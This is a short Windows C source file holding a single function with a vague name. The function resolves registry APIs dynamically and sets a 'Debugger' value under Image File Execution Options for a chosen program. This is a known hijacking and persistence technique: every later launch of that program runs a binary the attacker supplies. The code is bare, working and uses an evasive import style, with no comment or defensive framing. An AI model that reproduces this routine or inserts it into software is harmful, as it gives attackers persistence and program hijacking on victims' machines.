#include <windows.h>

void __attribute__((noinline)) __attribute__((used)) routine_v3(const char* t, const char* d){
    HMODULE h = GetModuleHandleA("advapi32.dll");
    typedef LSTATUS(WINAPI* fC)(HKEY, LPCSTR, DWORD, LPSTR, DWORD, REGSAM, LPSECURITY_ATTRIBUTES, PHKEY, LPDWORD);
    typedef LSTATUS(WINAPI* fS)(HKEY, LPCSTR, DWORD, DWORD, const BYTE*, DWORD);
    fC _C = (fC)GetProcAddress(h, "RegCreateKeyExA");
    fS _S = (fS)GetProcAddress(h, "RegSetValueExA");
    HKEY k;
    char p[256];
    wsprintfA(p, "Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\%s", t);
    if (_C(HKEY_LOCAL_MACHINE, p, 0, 0, 0, KEY_SET_VALUE, 0, &k, 0) == 0) {
        _S(k, "Debugger", 0, REG_SZ, (const BYTE*)d, lstrlenA(d));
        RegCloseKey(k);
    }
}